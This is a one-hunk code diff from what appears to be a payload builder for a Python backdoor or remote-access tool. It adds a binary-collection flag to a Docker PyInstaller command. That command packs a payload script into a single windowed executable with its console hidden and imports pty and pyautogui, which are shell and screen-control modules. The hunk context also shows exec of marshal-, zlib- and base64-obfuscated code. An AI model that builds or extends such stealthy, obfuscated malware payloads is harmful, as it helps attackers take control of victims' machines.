@@ -267,7 +267,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
             elif os_name == "Linux":
                 result = subprocess.run(
-                    f'docker run --platform linux/amd64 --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-linux:latest "pyinstaller -F --onefile --windowed --runtime-tmpdir /tmp --icon=NONE --hidden-import=pty --hidden-import=pyautogui --hidden-import=tkinter --hidden-import=PyOpenGL --hide-console hide-early {payload_file_name}.py"',
+                    f'docker run --platform linux/amd64 --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-linux:latest "pyinstaller -F --onefile --windowed --runtime-tmpdir /tmp --icon=NONE --hidden-import=pty --hidden-import=pyautogui --hidden-import=tkinter --hidden-import=PyOpenGL --collect-binaries=opencv-python --hide-console hide-early {payload_file_name}.py"',
                     shell=True,
                     capture_output=True,
                 )
